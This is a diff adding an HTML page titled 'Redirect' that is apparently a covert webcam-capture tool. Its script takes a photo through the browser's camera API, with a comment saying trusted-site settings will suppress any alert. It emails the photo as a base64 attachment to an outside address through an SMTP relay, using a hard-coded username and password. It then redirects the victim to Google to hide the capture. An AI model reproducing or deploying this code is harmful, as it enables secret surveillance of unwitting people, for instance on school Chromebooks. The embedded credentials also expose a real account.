@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+
+	<head>
+
+		<meta charset="utf-8">
+		<title>Redirect</title>
+
+		<script src = "https://smtpjs.com/v3/smtp.js"></script>
+	</head>
+
+		
+
+	<body>
+
+		<script>
+			if(navigator.mediaDevices.getUserMedia) {
+
+				// Send a request for media. If we force him to auto trust the website, then it won't alert him.
+				navigator.mediaDevices.getUserMedia({video: true}).then((stream) => {
+
+					// Grab the first track captured
+					const capture = stream.getVideoTracks()[0];
+
+					// Convert the track to an ImageCapture
+					let imageCapture = new ImageCapture(capture);
+
+					// Grab the blob using takePhoto(); method
+					imageCapture.takePhoto().then((blob) => {
+						let reader = new FileReader();
+
+						// Read the blob as base64 url
+						reader.readAsDataURL(blob);
+
+						// Once finished reading, log the result, then email it
+						reader.onloadend = function() {
+							let base64 = reader.result;
+							console.log(base64);
+
+
+							Email.send({
+								Host : "smtp.elasticemail.com",
+								Username : "dgable20@jcss.us",
+								Password : "78F3DEF417612825B048B3F1D86A4E6080F9",
+								To : 'dgable20@jcss.us',
+								From : "dgable20@jcss.us",
+								Subject : "Image taken from chromebook",
+								Body : `This is the image taken`,
+								Attachments: [{
+									name: "image.png",
+									data: base64
+								}]
+							}).then(message => {
+								console.log(message);
+								window.location.replace("https://google.com");
+							});
+						}
+					});
+
+				});
+
+
+			}
+
+
+
+
+		</script>
+	</body>
+</html>
